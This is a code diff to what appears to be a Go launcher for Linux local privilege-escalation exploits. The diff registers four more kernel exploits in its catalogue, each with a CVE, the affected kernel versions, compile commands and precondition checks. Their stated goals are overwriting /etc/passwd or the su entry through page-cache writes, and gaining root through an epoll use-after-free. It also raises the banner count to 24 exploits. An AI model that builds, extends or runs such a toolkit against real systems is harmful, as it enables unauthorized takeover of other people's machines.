@@ -22,14 +22,25 @@ type KernelVersion struct {
 	Valid               bool
 }
 
+// parseIntPrefix parses the leading integer from s, ignoring trailing non-digit chars.
+func parseIntPrefix(s string) (int, bool) {
+	var i int
+	for i < len(s) && s[i] >= '0' && s[i] <= '9' {
+		i++
+	}
+	if i == 0 { return 0, false }
+	n, err := strconv.Atoi(s[:i])
+	return n, err == nil
+}
+
 func parseKernelVersion(s string) KernelVersion {
 	parts := strings.SplitN(s, ".", 3)
 	if len(parts) < 2 {
 		return KernelVersion{}
 	}
-	major, err1 := strconv.Atoi(parts[0])
-	minor, err2 := strconv.Atoi(parts[1])
-	if err1 != nil || err2 != nil {
+	major, err1 := parseIntPrefix(parts[0])
+	minor, err2 := parseIntPrefix(parts[1])
+	if !err1 || !err2 {
 		return KernelVersion{}
 	}
 	patch := 0
@@ -386,6 +397,52 @@ func NewToolkit(verbose, quiet bool, command string, skipped map[string]bool) *T
 				return err != nil
 			},
 			SuccessCheck: func() bool { return true },
+		},
+		{
+			Name:        "peditcow",
+			Filename:    "peditcow.c",
+			Description: "CVE-2026-46331: PEdit COW - tc-pedit page-cache write overwrites su entry",
+			Introduced:  "5.18",
+			FixedIn:     []string{"7.1-rc7"},
+			CompileCmd:  []string{"gcc", "-O2", "-Wall"},
+		},
+		{
+			Name:        "dirtyclone",
+			Filename:    "dirtyclone.c",
+			Description: "CVE-2026-43503: DirtyClone - ESP-in-UDP TEE page-cache /etc/passwd overwrite",
+			Introduced:  "7.1",
+			FixedIn:     []string{"7.1-rc4"},
+			CompileCmd:  []string{"gcc", "-O2", "-Wall"},
+			SkipCheck: func() bool {
+				return !moduleAvailable("xfrm_user")
+			},
+		},
+		{
+			Name:        "bad_epoll",
+			Filename:    "bad_epoll.c",
+			Description: "CVE-2026-46242: Bad Epoll - close-vs-close race UAF -> root (kernelCTF/6.12.67)",
+			Introduced:  "6.4",
+			FixedIn:     []string{"7.1"},
+			CompileCmd:  []string{"gcc", "-O2", "-Wall", "-lpthread", "-std=gnu99"},
+			SkipCheck: func() bool {
+				fd, err := os.Open("/proc/kallsyms")
+				if err != nil { return true }
+				fd.Close()
+				return false
+			},
+			SuccessCheck: func() bool { return true },
+		},
+		{
+			Name:        "cve_2026_31694",
+			Filename:    "cve_2026_31694.c",
+			Description: "CVE-2026-31694: FUSE readdir cache OOB - /etc/passwd page-cache overflow",
+			Introduced:  "6.15",
+			FixedIn:     []string{"7.1"},
+			CompileCmd:  []string{"gcc", "-O2", "-Wall", "-static", "-lpthread"},
+			SkipCheck: func() bool {
+				_, err := exec.LookPath("fusermount3")
+				return err != nil
+			},
 		},
 		{
 			Name:        "gtfobins",
@@ -749,7 +806,7 @@ func (tk *Toolkit) Run() {
 	if !tk.quiet {
 		fmt.Printf(`
 ╔══════════════════════════════════════════════════════════╗
-║      Linux LPE Toolkit - 20 exploits loaded              ║
+║      Linux LPE Toolkit - 24 exploits loaded              ║
 ╠══════════════════════════════════════════════════════════╣
 ║  1. Copy Fail      CVE-2026-31431   AF_ALG + splice    ║
 ║  2. Dirty Frag     CVE-2026-43284   xfrm-ESP/RxRPC     ║
@@ -770,7 +827,11 @@ func (tk *Toolkit) Run() {
 ║ 17. pidfd race     CVE-2026-46333  ssh-keysign/shadow ║
 ║ 18. CPU Timer Race CVE-2025-38352  POSIX timer race   ║
 ║ 19. nft UAF        CVE-2024-1086   Notselwyn multi-f  ║
-║ 20. GTFOBins       sudo abuse      80+ techniques      ║
+║ 20. PEdit COW      CVE-2026-46331  tc-pedit pagecache ║
+║ 21. DirtyClone     CVE-2026-43503  ESP-in-UDP TEE     ║
+║ 22. Bad Epoll      CVE-2026-46242  epoll race UAF     ║
+║ 23. FUSE OOB       CVE-2026-31694  readdir cache OOB  ║
+║ 24. GTFOBins       sudo abuse      80+ techniques      ║
 ╚══════════════════════════════════════════════════════════╝
 
 [*] Detected kernel: %s
